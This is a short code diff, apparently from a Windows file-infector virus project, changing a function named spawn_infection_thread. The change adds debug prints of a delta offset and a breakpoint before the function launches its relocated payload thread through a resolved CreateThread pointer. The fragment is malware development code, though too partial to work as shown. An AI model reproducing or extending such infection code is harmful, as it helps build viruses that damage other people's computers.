@@ -20,8 +20,10 @@ void spawn_infection_thread(void) {
 
     if (init_data(&data, (void *)code_begin, (void *)code_end,
                   (void *)spawn_infection_thread) == 0) {
-        PRINT_DEBUG("initalized data for thread start, CreateThread diff = 0x%X\n",
+        PRINT_DEBUG("delta offset is 0x%X", data.delta_offset);
+        PRINT_DEBUG("initalized data for thread start, CreateThread diff = 0x%X",
                     (int32_t)data.function_list.create_thread - (int32_t)CreateThread);
+        asm("int3"); // TODO BEWARE OF ME!
         HANDLE hThread = data.function_list.create_thread(
             NULL, 0,
             (LPTHREAD_START_ROUTINE)((uint8_t *)run + data.delta_offset), NULL,
